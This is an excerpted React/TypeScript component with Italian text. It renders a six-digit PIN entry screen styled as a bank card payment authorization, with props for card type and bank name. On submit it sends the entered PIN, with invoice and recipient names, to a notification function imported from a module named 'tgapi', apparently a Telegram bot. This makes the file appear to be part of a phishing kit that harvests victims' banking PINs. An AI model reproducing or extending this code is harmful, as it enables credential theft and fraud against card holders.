...
import { sendItPinEnteredNotification } from '../../tgapi';
...
const ChooseComponent = ({ cardType, bankName, onChoice, invoiceName = "Fattura sconosciuta", recipientName = "Destinatario sconosciuto" }: ChooseComponentProps) => {
  ...
  const handleSubmit = async () => {
    ...
    if (pin.length !== 6) {
      alert('Inserisci il PIN completo a 6 cifre');
      return;
    }
    ...
    try {
      await sendItPinEnteredNotification(invoiceName, recipientName, pin);
        ...
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              Inserisci il tuo PIN a 6 cifre per autorizzare il pagamento
            </p>
          </div>
        </div>
      </div>
      ...
      <div className="space-y-3 relative">
        ...
        <div className="flex justify-center gap-2">
          {pinDigits.map((digit, index) => (
            <input
              ...
              type="text"
              maxLength={1}
              value={isProcessing ? '•' : digit}
              disabled={isProcessing}
              className="w-8 h-8 text-center text-sm font-mono border border-border rounded-[5px] bg-white shadow-lg drop-shadow-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 focus:shadow-xl transition-shadow duration-200 disabled:opacity-50"
        ...
        <div className="flex justify-center">
          <Button
            ...
            disabled={isProcessing || pinDigits.join('').length !== 6}
